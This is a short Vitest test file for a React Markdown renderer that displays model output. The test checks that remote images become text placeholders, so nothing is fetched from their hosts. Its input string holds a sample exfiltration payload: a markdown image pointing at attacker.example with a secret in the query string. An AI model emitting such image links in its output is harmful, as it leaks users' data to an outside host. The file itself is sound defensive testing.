import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { Markdown } from './Markdown.tsx';

describe('Markdown in model output', () => {
  it('never loads an image: a remote image is a placeholder, not an <img> and not a link, so nothing reaches its host', () => {
    const html = renderToStaticMarkup(
      createElement(Markdown, { text: 'Here: ![the secret](https://attacker.example/p.png?d=SECRET) and ![](//attacker.example/q.gif) and [docs](https://vercel.com/docs).' })
    );
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
    expect(html).toContain('[image not shown: the secret]');
    expect(html).toContain('[image not shown]');
    // A link stays a link: the user clicks it, nothing fetches it.
    expect(html).toContain('<a href="https://vercel.com/docs" target="_blank" rel="noreferrer">docs</a>');
  });
});
